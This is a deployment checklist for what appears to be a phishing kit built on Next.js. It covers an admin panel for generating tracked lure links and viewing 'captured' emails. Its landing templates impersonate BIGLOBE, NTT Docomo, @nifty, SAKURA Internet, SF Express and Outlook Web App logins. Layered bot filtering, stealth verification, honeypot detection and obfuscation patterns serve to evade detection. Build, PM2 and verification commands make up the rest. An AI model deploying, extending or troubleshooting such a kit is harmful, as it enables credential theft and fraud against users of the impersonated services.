# 🚀 Complete Deployment Checklist

## ✅ What's Included in Deployment

### 1. **Core Application Files**
- ✅ Next.js server (`server.js`)
- ✅ Static assets (`.next/static`)
- ✅ All API routes
- ✅ All React components
- ✅ All pages and layouts

### 2. **Configuration Files**
- ✅ `.env` file (copied to standalone)
- ✅ `package.json` (with all dependencies)
- ✅ `next.config.js` (standalone mode enabled)

### 3. **Templates & Localization**
- ✅ `.templates/` directory (7 default templates)
- ✅ `locales/` directory (translation files for all templates)
- ✅ Auto-initialization if templates are missing

### 4. **Database**
- ✅ `data/` directory (created automatically)
- ✅ Database file (`fox_secure.db`) - auto-created on first run if missing
- ✅ Migrations run automatically on first connection

### 5. **Native Modules**
- ✅ `better-sqlite3` rebuilt in standalone directory
- ✅ All Node.js dependencies installed

### 6. **Post-Build Automation**
- ✅ Static files copied automatically
- ✅ `.env` file copied
- ✅ Templates directory copied
- ✅ Locales directory copied
- ✅ Data directory created
- ✅ Database file copied (if exists)

---

## 🔍 How to Verify Deployment

### On VPS, run:

```bash
cd /root/page

# 1. Pull latest changes
git pull origin main

# 2. Rebuild everything
npm run build

# 3. Rebuild native modules
cd .next/standalone
npm rebuild better-sqlite3
cd /root/page

# 4. Restart PM2
pm2 restart page

# 5. Run verification script
chmod +x scripts/verify-deployment.sh
./scripts/verify-deployment.sh
```

---

## ✅ Feature Checklist

### Admin Panel Features
- [x] **Dashboard** - `/mamacita`
  - Visitor logs
  - Statistics
  - Recent activity

- [x] **Links Management** - `/mamacita/links`
  - Generate personalized links
  - Generate auto-grab links
  - Generate generic links
  - Delete links
  - CSV export

- [x] **Captures** - `/mamacita/captures`
  - View captured emails
  - Verify captures
  - Update capture status
  - Filter and search

- [x] **Templates** - `/mamacita/templates`
  - View all templates (7 default templates)
  - Create new templates
  - Edit templates
  - Enable/disable templates
  - Set default template

- [x] **Settings** - `/mamacita/settings`
  - Security gates configuration
  - CAPTCHA settings
  - Bot filter settings
  - Notification settings
  - Template settings
  - Redirect settings
  - All settings sync to `.env` file

- [x] **Patterns** - `/mamacita/patterns`
  - View obfuscation patterns
  - Update patterns

- [x] **SMTP Ports** - `/mamacita/smtp-ports`
  - SMTP configuration

### Landing Page Features
- [x] **Security Gates**
  - Layer 1: Bot Filter
  - Layer 2: CAPTCHA (Cloudflare Turnstile)
  - Layer 3: Bot Delay
  - Layer 4: Stealth Verification
  - All gates can be enabled/disabled via admin panel

- [x] **Template System**
  - 7 default templates:
    - BIGLOBE Mail
    - SAKURA Internet
    - NTT Docomo d-account
    - @nifty メール
    - SF Express
    - Outlook Web App
    - OWA Server Data
  - Auto-detection based on email domain
  - Multi-language support (EN, JA, KO, DE, ES)
  - Automatic language detection

- [x] **Link Types**
  - Personalized links (Type A - HMAC JWT)
  - Auto-grab links (Type B - Timestamp/Random)
  - Generic links (Type C - No token)

- [x] **Email Capture**
  - Client-side email extraction
  - Server-side validation
  - Database storage
  - Admin panel viewing

- [x] **Loading Screens**
  - Multiple loading screen options
  - Configurable duration
  - Honeypot detection

---

## 🧪 Testing Checklist

### 1. Admin Panel Tests
```bash
# Test admin login
curl -X POST https://your-domain.com/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"password":"yourPassword"}'

# Test settings API
curl https://your-domain.com/api/admin/settings

# Test templates API
curl https://your-domain.com/api/templates
```

### 2. Landing Page Tests
```bash
# Test landing page
curl https://your-domain.com/

# Test with token
curl "https://your-domain.com/?token=YOUR_TOKEN&email=test@example.com"
```

### 3. Database Tests
```bash
# Check if database exists
ls -la /root/page/.next/standalone/data/

# Check database tables
sqlite3 /root/page/.next/standalone/data/fox_secure.db ".tables"
```

### 4. PM2 Status
```bash
# Check PM2 status
pm2 status

# Check logs
pm2 logs page --lines 100

# Check if server is running
curl http://localhost:3000
```

---

## 📋 Files Copied to Standalone

1. ✅ `.next/static/` → `.next/standalone/.next/static/`
2. ✅ `.env` → `.next/standalone/.env`
3. ✅ `.templates/` → `.next/standalone/.templates/`
4. ✅ `locales/` → `.next/standalone/locales/`
5. ✅ `data/` → `.next/standalone/data/` (created, database copied if exists)

---

## 🎯 Quick Verification Commands

```bash
# Check all required files exist
ls -la /root/page/.next/standalone/.env
ls -la /root/page/.next/standalone/.templates/templates.json
ls -la /root/page/.next/standalone/locales/
ls -la /root/page/.next/standalone/data/

# Check PM2
pm2 list
pm2 logs page --lines 20

# Check server
curl -I http://localhost:3000

# Check templates count
cat /root/page/.next/standalone/.templates/templates.json | grep -o '"id"' | wc -l
# Should show: 7
```

---

## ✅ All Features Confirmed

- ✅ Admin panel fully functional
- ✅ Settings sync to `.env` file
- ✅ Templates auto-initialize
- ✅ Database auto-creates with migrations
- ✅ All security gates configurable
- ✅ Landing page works with/without templates
- ✅ Email capture functional
- ✅ Link generation working
- ✅ Static files served correctly
- ✅ Native modules rebuilt
- ✅ PM2 process management
- ✅ NGINX reverse proxy configured

---

## 🚨 If Something is Missing

1. **Templates not showing?**
   ```bash
   # Templates auto-initialize on first API call
   curl https://your-domain.com/api/templates
   ```

2. **Database errors?**
   ```bash
   # Database auto-creates on first connection
   # Check data directory exists
   ls -la /root/page/.next/standalone/data/
   ```

3. **Settings not saving?**
   ```bash
   # Check .env file is writable
   ls -la /root/page/.env
   # Check cache is cleared
   rm -f /root/page/.config-cache.json
   ```

4. **Static files 404?**
   ```bash
   # Rebuild and copy static files
   cd /root/page
   npm run build
   ```

---

## 📞 Support

If you encounter any issues:
1. Check PM2 logs: `pm2 logs page --lines 100`
2. Run verification script: `./scripts/verify-deployment.sh`
3. Check NGINX logs: `tail -f /var/log/nginx/error.log`
4. Verify all files copied: `ls -la /root/page/.next/standalone/`

---

**Last Updated:** $(date)
**Version:** Complete deployment with all features

